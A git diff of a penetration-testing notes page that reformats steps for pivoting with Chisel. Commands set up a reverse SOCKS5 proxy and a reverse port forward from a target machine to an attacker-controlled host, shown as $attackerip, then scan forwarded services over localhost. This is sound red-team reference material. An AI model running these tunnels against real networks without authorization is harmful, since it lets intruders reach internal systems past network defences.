@@ -8,38 +8,56 @@ description: >-
 
 ### Setting up a SOCKS Proxy with Chisel
 
-1. Download the [latest Chisel binaries](https://github.com/jpillora/chisel)
-   * Note, you will need one for your attacking system and one to be uploaded to the target system.
-2. On the attacking system: `./chisel server --socks5 --reverse -p 8000`
-3. On the target system: `.\chisel.exe client [ATTACKER_IP]:8000 R:socks`
-4. Observe on the attacking system that the SOCKS5 connection has been successfully established.
+1\. Download the [latest Chisel binaries](https://github.com/jpillora/chisel)
 
-### Forwarding One Port with Chise;
+> Note, you will need a binary placed on your attacking system and one to be uploaded to the target system.
 
-On the attacking system:
+2\. On the attacking system:
+
+```bash
+./chisel server --socks5 --reverse -p 8000
+```
+
+3\. On the target system:&#x20;
+
+```bash
+.\chisel.exe client $attackerip:8000 R:socks
+```
+
+4\. Observe on the attacking system that the SOCKS5 connection has been successfully established.
+
+### Forwarding One Port with Chisel
+
+1\. On the attacking system:
 
 ```bash
 ./chisel server 9000 -reverse
 ```
 
-On the target system:&#x20;
+2\. On the target system:&#x20;
 
 ```bash
-.\chisel client [ATTACKER_IP]:9000 R:3306:127.0.0.1:3306
+.\chisel client $attackerip:9000 R:$localport:127.0.0.1:$remoteport
 ```
 
-### Verification
+#### Verification
 
 The easiest way to verify if your `Chisel` connection was successful is to run the following command:&#x20;
 
 ```bash
-ss -lnpt | grep 3306
+ss -lnpt | grep $localport
 ```
 
-### Interaction
+#### Interaction
 
-Ensure to remember that you will be interacting with `localhost` after forwarding a port. For example, by running `nmap -sC -sV -p3306 -n localhost`
+Ensure to remember that you will be interacting with `localhost` after forwarding a port. For example, by running&#x20;
+
+```bash
+nmap -sC -sV -p3306 -n localhost
+```
 
 ### References
 
 {% embed url="https://ap3x.github.io/posts/pivoting-with-chisel" %}
+
+{% embed url="https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html" %}
